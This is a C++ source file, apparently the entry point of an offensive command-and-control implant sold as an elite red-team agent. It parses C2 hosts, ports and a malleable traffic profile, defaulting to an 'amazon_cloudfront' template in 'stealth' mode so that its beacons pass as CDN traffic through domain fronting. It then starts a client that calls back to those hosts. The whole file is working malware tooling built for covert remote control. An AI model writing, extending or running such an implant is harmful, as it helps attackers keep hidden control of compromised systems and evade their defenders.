/*
 * Ostad Malleable C2 Client Agent - Native C++
 * Top 1% Red Team Multi-Egress Route Cycling & Domain Fronting Agent
 * Ostad Red Team Forge • Elite Offensive Security Edition
 */

#include "Client.hpp"
#include "../include/MalleableGenerator.hpp"
#include "../include/MalleableParser.hpp"

#include <iostream>
#include <fstream>
#include <string>
#include <sstream>

using namespace OstadC2;

int main(int argc, char* argv[]) {
    std::cout << "\033[1;31m";
    std::cout << R"(
    =======================================================================
       ___  ____ _____ ___    ____     ____ _    _ ____ _  _ ___ 
      |   | [__    |   |__|  |  | \   |     |    | |___ |\ |  |  
      |___| ___]   |   |  |  |__| /   |___  |___ | |___ | \|  |  
    =======================================================================
    )" << "\033[0m\n";
    std::cout << "\033[1;36m    🦅 OSTAD MALLEABLE C2 CLIENT (TOP 1% RED TEAM CORE)\033[0m\n";
    std::cout << "\033[1;37m    Founder & Director: Ostad Rezaul Karim (Top 1% Red Teamer)\033[0m\n";
    std::cout << "    -----------------------------------------------------------------------\n\n";

    std::vector<std::string> c2_list = {"127.0.0.1"};
    int port = 8080;
    std::string profile_path = "";
    std::string template_name = "amazon_cloudfront";
    int count = 5;

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if ((arg == "--host" || arg == "--c2") && i + 1 < argc) {
            std::string hosts = argv[++i];
            c2_list.clear();
            std::stringstream ss(hosts);
            std::string item;
            while (std::getline(ss, item, ',')) {
                if (!item.empty()) c2_list.push_back(item);
            }
        } else if (arg == "--port" && i + 1 < argc) {
            port = std::stoi(argv[++i]);
        } else if (arg == "--profile" && i + 1 < argc) {
            profile_path = argv[++i];
        } else if (arg == "--template" && i + 1 < argc) {
            template_name = argv[++i];
        } else if (arg == "--count" && i + 1 < argc) {
            count = std::stoi(argv[++i]);
        }
    }

    Profile profile;
    if (!profile_path.empty()) {
        std::ifstream f(profile_path);
        if (f.is_open()) {
            std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
            Lexer lexer(content);
            Parser parser(lexer.tokenize());
            profile = parser.parse();
            std::cout << "\033[1;32m[✓] Loaded custom profile: " << profile_path << "\033[0m\n";
        } else {
            profile = ProfileGenerator::generate(template_name, 3000, 20, "stealth");
        }
    } else {
        profile = ProfileGenerator::generate(template_name, 3000, 20, "stealth");
    }

    C2Client client(c2_list, port, profile);
    client.start(count);

    return 0;
}
